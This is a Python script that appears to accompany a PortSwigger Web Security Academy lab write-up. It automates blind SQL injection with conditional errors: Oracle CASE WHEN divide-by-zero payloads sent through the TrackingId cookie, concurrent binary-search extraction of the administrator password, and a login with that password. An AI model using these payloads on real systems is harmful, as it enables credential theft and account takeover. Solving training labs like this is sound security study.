#!/usr/bin/env python3
"""
Blind SQL injection with conditional errors
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 12-blind-conditional-errors.md

What this does:
    Injects into the TrackingId cookie against an Oracle backend with no
    visible content difference between true and false. Uses a CASE WHEN
    wrapped around 1/0 so the database only throws a divide-by-zero (HTTP 500)
    when the injected condition is true -- that status-code difference is the
    oracle. Extracts the administrator password length then every character
    via ASCII binary search, run concurrently across positions.

Usage:
    python 12-blind-conditional-errors.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed


def true_signal(r: httpx.Response) -> bool:
    return r.status_code == 500


def inject(client: httpx.Client, lab_url: str, tracking_id: str, session: str, suffix: str) -> httpx.Response:
    cookie = f"TrackingId={tracking_id}{suffix}; session={session}"
    return client.get(lab_url, headers={"Cookie": cookie})


def len_suffix(length: int) -> str:
    return (
        f"' AND (SELECT CASE WHEN (LENGTH(password)={length}) THEN TO_CHAR(1/0) ELSE 'a' END "
        f"FROM users WHERE username='administrator')='a'-- "
    )


def char_suffix(pos: int, mid: int) -> str:
    return (
        f"' AND (SELECT CASE WHEN (ASCII(SUBSTR(password,{pos},1))>{mid}) THEN TO_CHAR(1/0) ELSE 'a' END "
        f"FROM users WHERE username='administrator')='a'-- "
    )


def get_length(client: httpx.Client, lab_url: str, tracking_id: str, session: str) -> int:
    for length in range(1, 100):
        if true_signal(inject(client, lab_url, tracking_id, session, len_suffix(length))):
            return length
    return 0


def get_char(lab_url: str, tracking_id: str, session: str, pos: int) -> tuple[int, str]:
    client = httpx.Client(follow_redirects=True, timeout=15)
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        if true_signal(inject(client, lab_url, tracking_id, session, char_suffix(pos, mid))):
            lo = mid + 1
        else:
            hi = mid - 1
    return pos, chr(lo)


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    seed = client.get(lab_url)
    tracking_id = seed.cookies.get("TrackingId", "xyz")
    session = seed.cookies.get("session", "")

    length = get_length(client, lab_url, tracking_id, session)
    if not length:
        print("[-] Could not determine password length.")
        return
    print(f"[+] Password length: {length}")

    result_chars = [""] * length
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(get_char, lab_url, tracking_id, session, i + 1): i for i in range(length)}
        for future in as_completed(futures):
            pos, ch = future.result()
            result_chars[pos - 1] = ch
            print(f"[*] Progress: {''.join(result_chars)}", end="\r")

    password = "".join(result_chars)
    print(f"\n[+] administrator's password: {password}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": password, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
